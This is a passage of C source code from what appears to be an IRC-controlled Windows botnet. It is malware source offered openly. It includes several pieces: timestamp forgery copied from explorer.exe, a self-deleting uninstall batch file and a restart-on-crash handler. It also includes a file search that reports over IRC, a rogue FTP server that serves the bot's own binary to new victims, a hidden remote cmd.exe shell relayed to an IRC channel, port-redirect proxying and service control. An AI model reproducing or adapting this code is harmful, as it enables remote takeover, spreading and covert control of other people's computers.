		fSendMessage(mwnd,WM_USER + 200,1,0);
		fSendMessage(mwnd,WM_USER + 201,1,0);
		UnmapViewOfFile(mData);
		CloseHandle(hFileMap);

		return TRUE;
	 }
	else
		return FALSE;
}

void SetFileTime(char *Filename)
{
	FILETIME aFileTime, bFileTime, cFileTime;

	char exepath[MAX_PATH];
	if(fSearchPath(NULL,"explorer.exe",NULL,sizeof(exepath),exepath,NULL) == 0)
		return;  

	HANDLE hTimeFile = CreateFile(exepath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hTimeFile != INVALID_HANDLE_VALUE) {
		GetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
		CloseHandle(hTimeFile);

		hTimeFile = CreateFile(Filename, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hTimeFile != INVALID_HANDLE_VALUE) {
			SetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
			CloseHandle(hTimeFile);
		}
	}

	return;
}

DWORD CreateProc(char *file, char *param)
{	
	PROCESS_INFORMATION pinfo; 
	STARTUPINFO sinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	memset(&sinfo, 0, sizeof(STARTUPINFO));
	sinfo.cb=sizeof(sinfo); 
	sinfo.dwFlags = STARTF_USESHOWWINDOW;
	sinfo.wShowWindow = SW_HIDE;

	char cmdline[1024];
	_snprintf(cmdline,sizeof(cmdline),"%s %s",file, param);

	if (CreateProcess(file, cmdline, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == 0)
		return 0; 

	return (pinfo.dwProcessId); 
}

BOOL Reboot(void)
{
	AdjustPrivileges(SE_SHUTDOWN_NAME, TRUE);

	if (!fExitWindowsEx(EWX_SYSTEM_REBOOT /* or EWX_FORCE_SHUTDOWN */, SHUTDOWN_SYSTEM_HUNG))
		return FALSE;

	return TRUE;
}

void uninstall(void)
{
	char buffer[1024], cmdline[MAX_PATH], botfile[MAX_PATH], batfile[MAX_PATH];

	if ((AutoStart) && !(noadvapi32))
		AutoStartRegs();

	killthreadall();
	
	GetTempPath(sizeof(buffer), buffer);
	sprintf(batfile, "%sdel.bat", buffer);
	HANDLE f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		DWORD r;

		sprintf(buffer,"@echo off\r\n"
					":repeat\r\n"
					"del \"%%1\"\r\n"
					"if exist \"%%1\" goto repeat\r\n"
					"del \"%s\"", batfile);
		WriteFile(f, buffer, strlen(buffer), &r, NULL);
		CloseHandle(f);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), botfile, sizeof(botfile));
		if (GetFileAttributes(botfile) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(botfile,FILE_ATTRIBUTE_NORMAL);
		sprintf(buffer, "%%comspec%% /c %s %s", batfile, botfile);
		ExpandEnvironmentStrings(buffer, cmdline, sizeof(cmdline));

		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, BELOW_NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}
	
	return;
}
int randnum(int range) {
	srand(GetTickCount());
	return (rand() % range);
}

// globals
extern FILE *fp;

// irc send functions
void irc_sendv(SOCKET sock, char *msg, ...)
{
	char msgbuf[IRCLINE];

	va_list argp;
	va_start(argp, msg); 
	_vsnprintf(msgbuf, sizeof(msgbuf), msg, argp);
	fsend(sock, msgbuf, strlen(msgbuf), 0);

	#ifdef DEBUG_LOGGING
	debuglog(msgbuf,FALSE);
	#endif

	return;
}

void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice, BOOL delay)
{
	char msgbuf[IRCLINE], tmpbuf[IRCLINE], *action;

	if (notice) 
		action = "NOTICE"; 
	else 
		action = "PRIVMSG";

	int bufsize = IRCLINE - strlen(action) - strlen(dest) - 6 ; // trust me
	_snprintf(tmpbuf,bufsize,"%s",msg);
	sprintf(msgbuf,"%s %s :%s\r\n", action, dest, tmpbuf);
	fsend(sock, msgbuf, strlen(msgbuf), 0);

	#ifdef DEBUG_LOGGING
	debuglog(msgbuf,FALSE);
	#endif

	if(delay)
		Sleep(FLOOD_DELAY);

	return;
}

#ifndef NO_EHANDLER

// globals
DWORD scratch;

EXCEPTION_DISPOSITION cdecl _except_handler(struct _EXCEPTION_RECORD *ExceptionRecord,
	void *EstablisherFrame,struct _CONTEXT *ContextRecord,void *DispatcherContext)
{	

	fclosesocket(threads[0].sock);
	killthreadall();
	fWSACleanup();
	fWSACleanup();
	Sleep(100);
	
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.lpTitle = "";
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = STARTF_USESHOWWINDOW;
	#ifdef DEBUG_CONSOLE
	sinfo.wShowWindow = SW_SHOW;
	#else
	sinfo.wShowWindow = SW_HIDE;
	#endif
		
	char botfile[MAX_PATH],sysdir[MAX_PATH];
	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(NULL, botfile, sizeof(botfile));

	if (CreateProcess(NULL, botfile, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
		Sleep(100);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
	}

	ContextRecord->Eax = (DWORD)&scratch;

	_asm
	{                           // Remove our EXECEPTION_REGISTRATION record
		mov     eax,[ESP]       // Get pointer to previous record
		mov     FS:[0], EAX     // Install previous record
		add     esp, 8          // Clean our EXECEPTION_REGISTRATION off stack
	}

	ExitProcess(0);

	return ExceptionContinueExecution;
}
#endif

#ifndef NO_FINDFILE

DWORD WINAPI FindFileThread(LPVOID param) 
{
	FFIND ffind = *((FFIND *)param);
	FFIND *ffinds = (FFIND *)param;
	ffinds->gotinfo = TRUE;

	char sendbuf[IRCLINE];
	unsigned int numfound = 0;

	if (ffind.dirname[strlen(ffind.dirname)-1] == '\\')
		ffind.dirname[strlen(ffind.dirname)-1] = '\0';
	
	_snprintf(sendbuf,sizeof(sendbuf),"8::[4FiNd FiLe8]:: Searching for file: %s.",ffind.filename);
	if (!ffind.silent) irc_privmsg(ffind.sock,ffind.chan,sendbuf,ffind.notice);

	numfound = FindFile(ffind.sock,ffind.chan,ffind.notice,ffind.filename,ffind.dirname,numfound);
	sprintf(sendbuf,"8::[4FiNd FiLe8]:: Files found: %d.",numfound);
	if (!ffind.silent) irc_privmsg(ffind.sock,ffind.chan,sendbuf,ffind.notice);
	addlog(sendbuf);

	clearthread(ffind.threadnum);

	ExitThread(0);
}

unsigned int FindFile(SOCKET sock, char *chan, BOOL notice, char *filename, char *dirname, unsigned int numfound)
{
	char sendbuf[IRCLINE], tmpPath[MAX_PATH], newPath[MAX_PATH];

	WIN32_FIND_DATA fd;
	HANDLE fh;

	_snprintf(tmpPath, sizeof(tmpPath), "%s\\*", dirname);
	if ((fh = FindFirstFile(tmpPath, &fd)) != INVALID_HANDLE_VALUE)
		do {
			if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if (fd.cFileName[0] != '.' || (fd.cFileName[1] && fd.cFileName[1] != '.')) {
					_snprintf(newPath,sizeof(newPath),"%s\\%s", dirname,fd.cFileName);
					numfound = FindFile(sock, chan, notice, filename, newPath, numfound);			
				}
			}
		} while (FindNextFile(fh, &fd));
	FindClose(fh);

	_snprintf(tmpPath, sizeof(tmpPath), "%s\\%s", dirname, filename);
	if ((fh = FindFirstFile(tmpPath, &fd)) != INVALID_HANDLE_VALUE)
		do {
			numfound ++;
			_snprintf(sendbuf,sizeof(sendbuf)," Found: %s\\%s",dirname,fd.cFileName);
			irc_privmsg(sock,chan,sendbuf,notice, TRUE);
		} while (FindNextFile(fh, &fd));
	FindClose(fh);

	return (numfound);
}
#endif

#ifndef NO_FTPD

#pragma warning(disable : 4018)
#pragma comment(lib, "ws2_32")

SOCKET data_sock;

int ftp_Data_connect(char *ip,int port);
int Ftp_data_transfer();
int	FTP_PORT;
extern	SOCKET sock;

DWORD WINAPI ftpd(LPVOID pParam) {

	WSADATA wsdata;
	SOCKET listener;
	SOCKET newfd;

	char sendbuf[IRCLINE];
	struct sockaddr_in server_address;
	struct sockaddr_in remoteaddr;
	long h;
	int reuse_addr = 1;
	unsigned long mode = 1;
	int fdmax;
	int i;
	int addrlen;
	int nbytes;

	char buf[100];
//	char t_buf[1024];
	char tmpbuf[100];
	char tmpbuf2[100];
	char a[4];
	char b[4];
	char c[4];
	char d[4];
	char p1[50];
	char p2[50];
	char tmpip[15];
	int po,po2;

	FTP ftp = *((FTP *)pParam);
	FTP *ftps = (FTP *)pParam;
	ftps->gotinfo = TRUE;

	struct fd_set master;   // master file descriptor list
	struct fd_set read_fds; // temp file descriptor list for select()

	FD_ZERO(&master);    // clear the master and temp sets
	FD_ZERO(&read_fds);

	WSAStartup(0x0101, &wsdata);

	srand(time(NULL));
	FTP_PORT = rand()%64535+1000;

	listener = socket(AF_INET, SOCK_STREAM, 0);
	setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse_addr,sizeof(reuse_addr));
	ioctlsocket(listener, FIONBIO, &mode);

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = INADDR_ANY;
	server_address.sin_port = htons(FTP_PORT);

	if (bind(listener, (struct sockaddr *) &server_address,sizeof(server_address)) < 0 ) {
		return 1;
	}

	listen(listener,10);

	FD_SET(listener, &master);

	fdmax = listener;


	while(1) {
		read_fds = master;
		if (select(fdmax+1, &read_fds, NULL, NULL, NULL) == -1) {
			return 1;
    	}
		for(i = 0; i <= fdmax; i++) {
			memset(buf,0,sizeof(buf));
			memset(tmpbuf,0,sizeof(tmpbuf));
			if (FD_ISSET(i, &read_fds)) {
				if (i == (int)listener) {
					addrlen = sizeof(remoteaddr);
					if ((newfd = accept(listener, (struct sockaddr *)&remoteaddr,&addrlen)) != -1) {
						FD_SET(newfd, &master);
						if ((int)newfd > fdmax) {
							fdmax = newfd;
						}
						send(newfd, "220 StnyFtpd 0wns j0\n",21 , 0);
					}
				} else {
					if ((nbytes = recv(i, buf, sizeof(buf), 0)) <= 0) {
						FD_CLR(i, &master);
						closesocket(i);
					} else {
						sscanf(buf,"%s %s",tmpbuf,tmpbuf2);
						if (strcmp(tmpbuf,"USER") == 0) {
							send(i,"331 Password required\n",22 , 0);
						}
						else if (strcmp(tmpbuf,"PASS") == 0) {
							send(i,"230 User logged in.\n",20 , 0);
						}
						else if (strcmp(tmpbuf,"SYST") == 0) {
							send(i,"215 StnyFtpd\n",13 , 0);
						}
						else if (strcmp(tmpbuf,"REST") == 0) {
							send(i,"350 Restarting.\n",16 , 0);
						}
						else if (strcmp(tmpbuf,"PWD") == 0) {
							send(i,"257 \"/\" is current directory.\n",30 , 0);
						}
						else if ((strcmp(tmpbuf,"TYPE") == 0) && (strcmp(tmpbuf2,"A") == 0)) {
							send(i,"200 Type set to A.\n",19 , 0);
						}
						else if ((strcmp(tmpbuf,"TYPE") == 0) && (strcmp(tmpbuf2,"I") == 0)) {
							send(i,"200 Type set to I.\n",19 , 0);
						}
						else if (strcmp(tmpbuf,"PASV") == 0) {
							char pasv[] = "425 Passive not supported on this server\n";
							send(i, pasv, strlen(pasv), 0);
						}
						else if (strcmp(tmpbuf,"LIST") == 0) {
							char list[] = "226 Transfer complete\n";
							send(i, list, strlen(list), 0);
						}
						else if (strcmp(tmpbuf,"PORT") == 0) {
							sscanf(buf,"%*s %[^,],%[^,],%[^,],%[^,],%[^,],%[^\n]",a,b,c,d,p1,p2);
							po = atoi(p1);
							po2 = atoi(p2);
							memset(p1,0,sizeof(p1));
							sprintf(p1,"%x%x\n",po,po2);
							h = strtoul(p1, NULL, 16);
							sprintf(tmpip,"%s.%s.%s.%s",a,b,c,d);
							send(i,"200 PORT command successful.\n",29 , 0);

						}
						else if (strcmp(tmpbuf,"RETR") == 0) {
							send(i,"150 Opening BINARY mode data connection\n",40 , 0);
					        sprintf(sendbuf,"8::[4FtP8]:: Transfer Started On 8::[15 %s 8]:: Sending ::(15 %s 1)::",tmpip,filename);
					        if (!ftp.silent) irc_privmsg(ftp.sock,ftp.chan,sendbuf,ftp.notice);
					        addlog(sendbuf);
							if(ftp_Data_connect(tmpip,(int)h) == 1) {
								if (Ftp_data_transfer() == 1) {
									send(i,"226 Transfer complete.\n",23 , 0);
								}
							} else {
								send(i,"425 Can't open data connection.\n",32,0);
								sprintf(sendbuf,"8::[4FtP8]:: Transfer Failed On 8::[4 %s 8]::",tmpip);
								if (!ftp.silent) irc_privmsg(ftp.sock,ftp.chan,sendbuf,ftp.notice);
								addlog(sendbuf);
							}
						}
						else if (strcmp(tmpbuf,"QUIT") == 0) {
							send(i,"221 Goodbye happy r00ting.\n",27 , 0);
							sprintf(sendbuf,"8::[4FtP8]:: Transfer Complete On 8::[4 %s 8]:: Executing ::(4 %s 1)::",tmpip,filename);
							if (!ftp.silent) irc_privmsg(ftp.sock,ftp.chan,sendbuf,ftp.notice);
							addlog(sendbuf);
						}
						memset(buf,0,sizeof(buf));
					}
				}
			}
		}
	}
	return 1;
}

int ftp_Data_connect(char *ip,int port)
{
	struct	sockaddr_in	server;
	WSADATA wsdata;

	WSAStartup(0x0101, &wsdata);

	data_sock = socket(AF_INET, SOCK_STREAM, 0);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(ip);
    server.sin_port = htons(port);

	if (connect(data_sock,(struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) {
		closesocket(data_sock);
		WSACleanup();
		return 0;
	}
	return 1;
}

int Ftp_data_transfer() {
	FILE * fid;
	char myfname[MAX_PATH];
	unsigned char buffer[1024];
	GetModuleFileName(NULL,myfname,sizeof(myfname));

	fid = fopen(myfname, "rb");
	if (!fid) { return 0; }

	while(!feof(fid))
	{
		fread(&buffer, sizeof(buffer), 1, fid);
		send(data_sock, (const char*)buffer, sizeof(buffer), 0);
		Sleep(1);
	}
	fclose(fid);
	closesocket(data_sock);
	WSACleanup();
	return 1;
}

#endif

#ifndef NO_REMOTECMD

HANDLE pipe_read;
HANDLE pipe_write;
HANDLE pipe_Hproc;
HANDLE hChildInWrDupe;
SOCKET pipesock;
char pipe_chan[50]; 

void Close_Handles(void)
{
	if (pipe_read != INVALID_HANDLE_VALUE) 
		CloseHandle(pipe_read);
	if (pipe_write != INVALID_HANDLE_VALUE) 
		CloseHandle(pipe_write);
	if (pipe_Hproc != INVALID_HANDLE_VALUE) 
		CloseHandle(pipe_Hproc);

	return;
}

BOOL send_commands(char *commands)
{ 
	DWORD cmdlen = strlen(commands);
	if (!WriteFile(hChildInWrDupe,commands,cmdlen,&cmdlen,NULL)) {
		Close_Handles(); 
		return FALSE;
	}

	return TRUE;
}

int pipe_send(SOCKET sock,char *chan,char *buf)
{
	char sendbuf[IRCLINE];

	if (strcmp(chan, "") != 0) {
		Sleep(FLOOD_DELAY);
		sprintf(sendbuf,"PRIVMSG %s :%s\r",chan,buf);
	} else 
		sprintf(sendbuf,"%s",buf);

	if (fsend(sock,sendbuf,strlen(sendbuf),0) <= 0) 
		Close_Handles();

	return 0;
}

DWORD WINAPI PipeReadThread(LPVOID param)
{
	DWORD numread, br;
	char buffer[IRCLINE];

	int threadnum = (int)param;

	while (1) {
		BOOL eol = FALSE;
		DWORD State;

		memset(buffer,0,sizeof(buffer));
		if (!PeekNamedPipe(pipe_read,buffer,IRCLINE,&br,NULL,NULL)) {
			pipe_send(pipesock,pipe_chan,"8::[4CmD8]:: Could not read data from proccess\r\n");
			clearthread(threadnum);

			ExitThread(1);
		}

		if (br == 0) { //nothing to read 
			if (GetExitCodeProcess(pipe_Hproc,&State)) { 
				if (State != STILL_ACTIVE) {
					Close_Handles(); 
					pipe_send(pipesock,pipe_chan,"8::[4CmD8]:: Proccess has terminated.\r\n");
					clearthread(threadnum);

					ExitThread (0);
				}
			}
			Sleep(10); //process pause and retry
			continue;
		}

		DWORD cbyte;
		for (cbyte=0;cbyte<br;cbyte++) {
			if (buffer[cbyte] == '\n') {
				eol = TRUE;
				break;
			}
		}
		if (eol) 
			br = cbyte + 1;
		else 
			br = 512;
		memset(buffer,0,sizeof(buffer));
		if (!ReadFile(pipe_read, buffer, br, &numread, NULL)) 
				break;
		pipe_send(pipesock,pipe_chan,buffer);

	}
	pipe_send(pipesock,pipe_chan,"8::[4CmD8]:: Could not read data from proccess.\r\n");
	clearthread(threadnum);

	ExitThread (0);
}

int open_cmd(SOCKET sock,char * chan)
{
	char buffer[IRCLINE], cmddir[MAX_PATH];
	int threadnum;

	SECURITY_ATTRIBUTES secAttr;
	HANDLE hChildOutRd, hChildOutWr, hChildInRd, hChildInWr;

	Close_Handles();

	if(fSearchPath(NULL,"cmd.exe",NULL,sizeof(cmddir),cmddir,NULL) == 0)
		return -1;  

    secAttr.nLength = sizeof(secAttr);
    secAttr.bInheritHandle = TRUE;
    secAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hChildOutRd, &hChildOutWr, &secAttr, 0)) 
		return -1;
    if (!CreatePipe(&hChildInRd, &hChildInWr, &secAttr, 0)) 
		return -1;
    if (!DuplicateHandle(GetCurrentProcess(), hChildInWr, GetCurrentProcess(), &hChildInWrDupe, 0, FALSE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE)) 
		return -1;

  	PROCESS_INFORMATION pinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	STARTUPINFO sinfo;
   	memset(&sinfo, 0, sizeof(sinfo));
   	sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    sinfo.wShowWindow = SW_HIDE;
    sinfo.hStdInput = hChildInRd;
    sinfo.hStdOutput = hChildOutWr;
	sinfo.hStdError = hChildOutWr;
   	if (!CreateProcess(cmddir,"", NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) 
		return -1;
   	CloseHandle(hChildInRd);

	DWORD id;
	pipe_read = hChildOutRd;
	pipe_write = hChildInWr;
	pipe_Hproc = pinfo.hProcess;
   	CloseHandle(pinfo.hThread);
	pipesock = sock;

	if (chan) 
		sprintf(pipe_chan,chan);
	else 
		sprintf(pipe_chan,""); 		

	threadnum = addthread("8::[4CmD8]:: Remote Command Prompt",RCMD_THREAD,NULL);
	threads[threadnum].pid = pinfo.dwProcessId;
	if ((threads[threadnum].tHandle = CreateThread(NULL, 0, &PipeReadThread, (LPVOID)threadnum, 0, &id)) == NULL) {
		sprintf(buffer,"8::[4CmD8]:: Failed to start IO thread, error: <%d>.", GetLastError());
		addlog(buffer);
	}

	return 0;
}
#endif

#ifndef NO_REDIRECT

// port redirect function
DWORD WINAPI RedirectThread(LPVOID param)
{
	REDIRECT redirect = *((REDIRECT *)param);
	REDIRECT *redirectp = (REDIRECT *)param;
	redirectp->gotinfo = TRUE;

	char sendbuf[IRCLINE];
	DWORD id;

	SOCKADDR_IN rsin, csin;	
	memset(&rsin, 0, sizeof(rsin));
	rsin.sin_family = AF_INET;
	rsin.sin_port = fhtons((unsigned short)redirect.lport);
	rsin.sin_addr.s_addr = INADDR_ANY;

	int csin_len = sizeof(csin);

	SOCKET rsock, csock;
	if ((rsock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET) {
		threads[redirect.threadnum].sock = rsock;

		fWSAAsyncSelect(rsock, 0, WM_USER + 1, FD_READ);
		if (fbind(rsock, (LPSOCKADDR)&rsin, sizeof(rsin)) == 0) {
			if (flisten(rsock, 10) == 0) {
				while(1) {
					if ((csock = faccept(rsock, (LPSOCKADDR)&csin, &csin_len)) != INVALID_SOCKET) {
						redirect.csock = csock;

						redirect.gotinfo = FALSE;
						sprintf(sendbuf,"8::[4ReDiReCt8]:: Client connection from IP: %s:%d, Server thread: %d.", finet_ntoa(csin.sin_addr), csin.sin_port, redirect.threadnum); 
						redirect.cthreadnum = addthread(sendbuf,REDIRECT_THREAD,csock);
						threads[redirect.cthreadnum].parent = redirect.threadnum;
						if (threads[redirect.cthreadnum].tHandle = CreateThread(NULL,0,&RedirectLoopThread,(LPVOID)&redirect,0,&id)) {
							while (redirect.gotinfo == FALSE) 
								Sleep(50);
						} else {
							addlogv("8::[4ReDiReCt8]:: Failed to start client thread, error: <%d>.", GetLastError());
							break;
						}
					}
				}
			}
		}
	}

	fclosesocket(csock);
	fclosesocket(rsock);
	clearthread(redirect.threadnum);

	ExitThread(0);
}

// part of the redirect function, handles sending/recieving for the remote connection.
DWORD WINAPI RedirectLoopThread(LPVOID param)
{
	REDIRECT redirect = *((REDIRECT *)param);
	REDIRECT *redirectp = (REDIRECT *)param;
	redirectp->gotinfo = TRUE;

	int threadnum=redirect.cthreadnum;

	char sendbuf[IRCLINE], buff[4096];
	int err;
	DWORD id;
	
	SOCKET ssock;
	do {
		if ((ssock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) break;

		SOCKADDR_IN ssin;
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons((unsigned short)redirect.port);

		IN_ADDR iaddr;
		iaddr.s_addr = finet_addr(redirect.dest);
		LPHOSTENT hostent;
		if (iaddr.s_addr == INADDR_NONE) 
			hostent = fgethostbyname(redirect.dest);
		else 
			hostent = fgethostbyaddr((const char *)&iaddr, sizeof(iaddr), AF_INET);
		if (hostent == NULL) break;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);
	
		if ((err = fconnect(ssock, (LPSOCKADDR)&ssin, sizeof(ssin))) == SOCKET_ERROR) break;

		redirect.cgotinfo = FALSE;
		sprintf(sendbuf,"8::[4ReDiReCt8]:: Client connection to IP: %s:%d, Server thread: %d.", finet_ntoa(ssin.sin_addr), ssin.sin_port, redirect.threadnum); 
		redirect.cthreadnum = addthread(sendbuf,REDIRECT_THREAD,ssock);
		threads[redirect.cthreadnum].parent = redirect.threadnum;
		threads[redirect.cthreadnum].csock = threads[threadnum].sock;
		if (threads[redirect.cthreadnum].tHandle = CreateThread(NULL,0,&RedirectLoop2Thread,(LPVOID)&redirect,0,&id)) {
			while (redirect.cgotinfo == FALSE) 
				Sleep(50);
		} else {
			addlogv("8::[4ReDiReCt8]:: Failed to start connection thread, error: <%d>.", GetLastError());
			break;
		}

		while (1) {
			memset(buff, 0, sizeof(buff));
			if ((err = frecv(threads[threadnum].sock, buff, sizeof(buff), 0)) <= 0) break;
			if ((err = fsend(ssock, buff, err, 0)) == SOCKET_ERROR) break;
		}
		break;
	} while (1);

	fclosesocket(threads[threadnum].sock);
	fclosesocket(ssock);

	clearthread(threadnum);

	ExitThread(0);
}

// part of the redirect function, handles sending/recieving for the local connection.
DWORD WINAPI RedirectLoop2Thread(LPVOID param)
{
	REDIRECT redirect = *((REDIRECT *)param);
	REDIRECT *redirectp = (REDIRECT *)param;
	redirectp->cgotinfo = TRUE;

	int threadnum=redirect.cthreadnum, err;
	
	char buff[4096];

	while (1) {
		memset(buff, 0, sizeof(buff));
		if ((err = frecv(threads[threadnum].csock, buff, sizeof(buff), 0)) <= 0) break;
		if ((err = fsend(threads[threadnum].sock, buff, err, 0)) == SOCKET_ERROR) break;
	}
	fclosesocket(threads[threadnum].csock);

	clearthread(threadnum);

	ExitThread(0);
}
#endif

#ifndef NO_NET
// globals
NetCommand netcommand[]={
	{"Add","Added",0},
	{"Delete","Deleted", 0},
	{"List","Listed", 0},
	{"Start","Started", 0},
	{"Stop","Stopped", SERVICE_CONTROL_STOP},
	{"Pause","Paused", SERVICE_CONTROL_PAUSE},
	{"Continue","Continued", SERVICE_CONTROL_CONTINUE}
};

char *Services(int action, char *ServiceName)
{
	static char buffer[IRCLINE];
	
	if (ServiceName) {
		DWORD svcError = ServiceControl(action, ServiceName, netcommand[action].control);
		if (svcError == 0)
			sprintf(buffer,"8::[4NeT8]:: %s service: '%s'.", netcommand[action].completed, ServiceName);
		else
			sprintf(buffer,"8::[4NeT8]:: Error with service: '%s'. %s", ServiceName, ServiceError(svcError));
	}
	else 
		sprintf(buffer,"8::[4NeT8]:: %s: No service specified.", netcommand[action].action);

	return (buffer);
}

DWORD ServiceControl(int option, char *ServiceName, DWORD dwControl, DWORD nArg, LPCTSTR *pArg) 
{ 
	DWORD svcError=0;
	SERVICE_STATUS status;

	SC_HANDLE schSCManager = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); 
	if (schSCManager == 0)
		svcError = GetLastError();  
	else {
		SC_HANDLE schService = fOpenService(schSCManager, ServiceName, SERVICE_ALL_ACCESS);
		if (schService == 0) 
			svcError = GetLastError();
		else {
			switch (option) {
			case NET_START:
				if (!fStartService(schService,nArg,pArg))
					svcError = GetLastError();
				break;
			case NET_DELETE:
				if (!fDeleteService(schService))
					svcError = GetLastError();
				break;
			case NET_STOP:
			case NET_PAUSE:
			case NET_CONTINUE:
				if (!fControlService(schService,dwControl,&status))
					svcError = GetLastError();
				break;
			default:
				break;
			}
			fCloseServiceHandle(schService); 
		}
		fCloseServiceHandle(schSCManager); 
	}

	return (svcError);
}

static char *ServiceError(DWORD svcError)
{
	static char retError[90];

	switch (svcError) {
	case ERROR_DATABASE_DOES_NOT_EXIST:
		sprintf(retError,"The specified database does not exist.");
		break;
	case ERROR_ACCESS_DENIED:
		sprintf(retError,"The handle does not have the required access right.");
		break;
	case ERROR_INVALID_NAME: 
		sprintf(retError,"The specified service name is invalid.");
		break;
	case ERROR_INVALID_HANDLE: 
		sprintf(retError,"The handle is invalid.");
		break;
	case ERROR_PATH_NOT_FOUND: 
		sprintf(retError,"The service binary file could not be found.");
		break;
	case ERROR_SERVICE_ALREADY_RUNNING: 
		sprintf(retError,"An instance of the service is already running.");
		break;
	case ERROR_SERVICE_DATABASE_LOCKED: 
		sprintf(retError,"The database is locked.");
		break;
	case ERROR_SERVICE_DEPENDENCY_DELETED: 
		sprintf(retError,"The service depends on a service that does not exist or has been marked for deletion.");
		break;
	case ERROR_SERVICE_DEPENDENCY_FAIL: 
		sprintf(retError,"The service depends on another service that has failed to start.");
		break;
	case ERROR_SERVICE_DISABLED: 
		sprintf(retError,"The service has been disabled.");
		break;
	case ERROR_SERVICE_DOES_NOT_EXIST: 
		sprintf(retError,"The specified service does not exist.");
		break;
	case ERROR_SERVICE_LOGON_FAILED: 
		sprintf(retError,"The service could not be logged on. The account does not have the correct access rights.");
		break;
	case ERROR_SERVICE_MARKED_FOR_DELETE: 
		sprintf(retError,"The service has been marked for deletion.");
		break;
	case ERROR_SERVICE_NO_THREAD: 
		sprintf(retError,"A thread could not be created for the service.");
		break;
	case ERROR_SERVICE_REQUEST_TIMEOUT: 
		sprintf(retError,"The process for the service was started, but it did not call StartServiceCtrlDispatcher."); 
		break;
	case ERROR_DEPENDENT_SERVICES_RUNNING: 
		sprintf(retError,"The service cannot be stopped because other running services are dependent on it.");
		break;
	case ERROR_INVALID_PARAMETER: 
		sprintf(retError,"The requested control code is undefined.");
		break;
	case ERROR_INVALID_SERVICE_CONTROL: 
		sprintf(retError,"The requested control code is not valid, or it is unacceptable to the service."); 
		break;
	case ERROR_SERVICE_CANNOT_ACCEPT_CTRL: 
		sprintf(retError,"The requested control code cannot be sent to the service because the state of the service."); 
		break;
	case ERROR_SERVICE_NOT_ACTIVE: 
		sprintf(retError,"The service has not been started."); 
		break;
	case ERROR_SHUTDOWN_IN_PROGRESS: 
		sprintf(retError,"The system is shutting down."); 
		break;
	default:
		sprintf(retError,"An unknown error occurred: <%ld>", svcError);
	}

	return (retError);

}

BOOL ListServices(SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE], svcState[20];

	ENUM_SERVICE_STATUS enumeration[10];
	DWORD bytesneeded, servicesreturned, resumehandle = 0;

	SC_HANDLE handle = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	irc_privmsg(sock,chan,"The following Windows services are registered:",notice);
 
	while (fEnumServicesStatus(handle, SERVICE_WIN32, SERVICE_STATE_ALL, enumeration,
		sizeof(ENUM_SERVICE_STATUS)*10, &bytesneeded, &servicesreturned, &resumehandle) ||
		GetLastError() == ERROR_MORE_DATA)
	{
		for (int i=0; i < (int)servicesreturned; i++) {
			switch (enumeration[i].ServiceStatus.dwCurrentState) {
			case SERVICE_STOPPED:
				sprintf(svcState,"    Stopped");
				break;
			case SERVICE_START_PENDING:
				sprintf(svcState,"   Starting");
				break;
			case SERVICE_STOP_PENDING:
				sprintf(svcState,"    Stoping");
				break;
			case SERVICE_RUNNING:
				sprintf(svcState,"    Running");
				break;
			case SERVICE_CONTINUE_PENDING:
				sprintf(svcState," Continuing");
				break;
			case SERVICE_PAUSE_PENDING:
				sprintf(svcState,"    Pausing");
				break;
			case SERVICE_PAUSED:
				sprintf(svcState,"     Paused");
				break;
			default:
				sprintf(svcState,"    Unknown");
				break;				
			}
			sprintf(buffer,"%s: %s (%s)", svcState, enumeration[i].lpServiceName, enumeration[i].lpDisplayName);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
		}
		if (resumehandle == 0)
			break;
	}
